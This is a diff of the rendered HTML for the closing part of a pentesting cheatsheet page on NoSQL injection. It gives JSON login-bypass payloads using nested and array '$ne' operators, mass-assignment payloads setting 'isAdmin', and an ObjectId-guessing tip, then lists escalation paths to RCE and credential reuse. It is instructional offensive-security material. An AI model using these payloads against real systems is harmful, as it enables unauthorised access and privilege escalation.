-<li><a href="https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb" target="_blank" rel="noopener noreferrer">HackTricks - CouchDB</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch" target="_blank" rel="noopener noreferrer">HackTricks - Elasticsearch</a>
-</li>
-</ul>
-<h2 id="xii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xii. Where it leads</span>
-    <a class="heading-permalink" href="#xii-where-it-leads" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Auth bypass via <code>$ne</code> → admin dashboard access, escalate via stored functions</li>
-<li>DB dump → cred reuse, see [[AD05 Password Spraying]] for the wider spray</li>
-<li><code>$where</code> JS execution → RCE on the DB host (or at least DB-side data manipulation)</li>
-<li>Mongo Express / unauth Mongo → full DB control + key file harvesting</li>
-<li>CouchDB admin RCE → [[04 Initial Access]] Linux foothold</li>
-<li>Elastic with <code>query.script</code> enabled (older versions) → RCE</li>
-</ul>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web03-sql-injection/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">SQL Injection</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web05-command-injection/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">Command Injection</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><p>PHP+MongoDB has similar nested array parsing.</p><h3 id=_id-enumeration data-heading-permalink=true><span class=heading-content><code>_id</code> enumeration</span>
+<a class=heading-permalink href=#_id-enumeration aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>ObjectId is 24 hex chars but NOT random - 4 bytes timestamp, 5 bytes random per host, 3 bytes counter. Predictable bytes mean adjacent IDs are guessable. Pull one user&rsquo;s ID, predict others.</p><h3 id=mass-assignment-via-json data-heading-permalink=true><span class=heading-content>Mass assignment via JSON</span>
+<a class=heading-permalink href=#mass-assignment-via-json aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Even without injection, JSON-receiving endpoints often accept extra fields:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;newuser&#34;</span><span class=p>,</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;x&#34;</span><span class=p>,</span> <span class=nt>&#34;isAdmin&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>}</span>
+</span></span></code></pre></div><p>Test every endpoint that accepts JSON for fields the form doesn&rsquo;t include. <code>role</code>, <code>isAdmin</code>, <code>_admin</code>, <code>permissions</code>, <code>verified</code>, <code>email_verified</code> - try them all.</p><h3 id=filter-bypass-via-deep-paths data-heading-permalink=true><span class=heading-content>Filter bypass via deep paths</span>
+<a class=heading-permalink href=#filter-bypass-via-deep-paths aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Some sanitizers check top-level keys only:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;password&#34;</span><span class=p>:{</span><span class=nt>&#34;nested&#34;</span><span class=p>:{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span><span class=s2>&#34;x&#34;</span><span class=p>}}}</span>
+</span></span></code></pre></div><p>Or via array indexing:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span><span class=nt>&#34;password&#34;</span><span class=p>:[{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span><span class=s2>&#34;x&#34;</span><span class=p>}]}</span>
+</span></span></code></pre></div><h2 id=xi-references data-heading-permalink=true><span class=heading-content>xi. References</span>
+<a class=heading-permalink href=#xi-references aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li><a href=https://portswigger.net/web-security/nosql-injection target=_blank rel="noopener noreferrer">PortSwigger - NoSQL Injection</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection target=_blank rel="noopener noreferrer">PayloadsAllTheThings - NoSQL Injection</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/nosql-injection target=_blank rel="noopener noreferrer">HackTricks - NoSQL Injection</a></li><li><a href=https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb target=_blank rel="noopener noreferrer">HackTricks - CouchDB</a></li><li><a href=https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch target=_blank rel="noopener noreferrer">HackTricks - Elasticsearch</a></li></ul><h2 id=xii-where-it-leads data-heading-permalink=true><span class=heading-content>xii. Where it leads</span>
+<a class=heading-permalink href=#xii-where-it-leads aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Auth bypass via <code>$ne</code> → admin dashboard access, escalate via stored functions</li><li>DB dump → cred reuse, see <a href=/cheatsheets/active-directory/ad05-password-spraying/>AD05 Password Spraying</a>
+for the wider spray</li><li><code>$where</code> JS execution → RCE on the DB host (or at least DB-side data manipulation)</li><li>Mongo Express / unauth Mongo → full DB control + key file harvesting</li><li>CouchDB admin RCE → <a href=/cheatsheets/linux-pentesting/04-initial-access/>04 Initial Access</a>
+Linux foothold</li><li>Elastic with <code>query.script</code> enabled (older versions) → RCE</li></ul></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/web/web03-sql-injection/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>SQL Injection</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/web/web05-command-injection/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>Command Injection</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
